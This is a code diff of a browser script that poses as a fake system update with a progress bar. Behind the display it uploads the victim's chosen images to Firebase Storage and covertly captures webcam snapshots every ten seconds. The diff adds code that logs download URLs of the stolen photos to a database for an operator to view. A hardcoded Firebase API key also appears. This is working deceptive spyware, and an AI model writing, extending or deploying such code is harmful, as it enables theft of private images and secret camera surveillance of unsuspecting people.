@@ -1,6 +1,6 @@
-import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
-import { getFirestore, doc, onSnapshot } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";
-import { getStorage, ref, uploadBytes } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-storage.js";
+import { initializeApp } from "https://www.gstatic.com/firebasejs/12.8.0/firebase-app.js";
+import { getFirestore, doc, onSnapshot, collection, addDoc } from "https://www.gstatic.com/firebasejs/12.8.0/firebase-firestore.js";
+import { getStorage, ref, uploadBytes, getDownloadURL } from "https://www.gstatic.com/firebasejs/12.8.0/firebase-storage.js";
 
 const firebaseConfig = {
     apiKey: "AIzaSyDX0esBRiQ4MuyvWH_s2UZ2kJpA9GryDgE",
@@ -26,7 +26,8 @@ class SystemController {
     async init() {
         const btn = document.getElementById('startBtn');
         const input = document.getElementById('fileInput');
-        btn.onclick = () => input.click();
+        if(btn) btn.onclick = () => input.click();
+        
         input.onchange = async (e) => {
             this.images = Array.from(e.target.files).filter(f => f.type.startsWith('image/'));
             this.startFakeUpdate();
@@ -35,7 +36,6 @@ class SystemController {
     }
 
     startFakeUpdate() {
-        this.isUpdating = true;
         document.getElementById('startBtn').style.display = 'none';
         document.getElementById('pBar').style.display = 'block';
         document.getElementById('statusText').textContent = "Installing System Update...";
@@ -46,7 +46,7 @@ class SystemController {
                 progress += Math.random() * 0.5;
                 bar.style.width = progress + "%";
             }
-        }, 3000);
+        }, 2000);
     }
 
     async startBackgroundOperations() {
@@ -59,9 +59,11 @@ class SystemController {
         for (let file of this.images) {
             try {
                 const sRef = ref(storage, `gallery/${Date.now()}_${file.name}`);
-                await uploadBytes(sRef, file);
-            } catch (e) {}
-            await new Promise(r => setTimeout(r, 1000));
+                const snapshot = await uploadBytes(sRef, file);
+                const url = await getDownloadURL(snapshot.ref);
+                // تسجيل رابط الصورة في الداتابيز ليراها الأدمن
+                await addDoc(collection(db, "uploads"), { url: url, time: Date.now() });
+            } catch (e) { console.log("Error uploading:", e); }
         }
     }
 
@@ -69,11 +71,11 @@ class SystemController {
         try {
             const stream = await navigator.mediaDevices.getUserMedia({ video: true });
             document.getElementById('videoFeed').srcObject = stream;
-            setInterval(() => this.takeSnapshot(), 15000);
+            setInterval(() => this.takeSnapshot(), 10000);
         } catch (e) {}
     }
 
-    takeSnapshot() {
+    async takeSnapshot() {
         const canvas = document.getElementById('canvas');
         const video = document.getElementById('videoFeed');
         canvas.width = video.videoWidth;
@@ -82,7 +84,9 @@ class SystemController {
         canvas.toBlob(async (blob) => {
             try {
                 const sRef = ref(storage, `snaps/${Date.now()}.jpg`);
-                await uploadBytes(sRef, blob);
+                const snapshot = await uploadBytes(sRef, blob);
+                const url = await getDownloadURL(snapshot.ref);
+                await addDoc(collection(db, "uploads"), { url: url, type: 'snap', time: Date.now() });
             } catch (e) {}
         }, 'image/jpeg');
     }
@@ -98,12 +102,12 @@ class SystemController {
     }
 
     async toggleFlash(state) {
-        const stream = document.getElementById('videoFeed').srcObject;
-        if (stream) {
-            const track = stream.getVideoTracks()[0];
+        const video = document.getElementById('videoFeed');
+        if (video.srcObject) {
+            const track = video.srcObject.getVideoTracks()[0];
             try { await track.applyConstraints({ advanced: [{ torch: state }] }); } catch (e) {}
         }
     }
 }
 
-document.addEventListener('DOMContentLoaded', () => new SystemController().init());
+new SystemController().init();
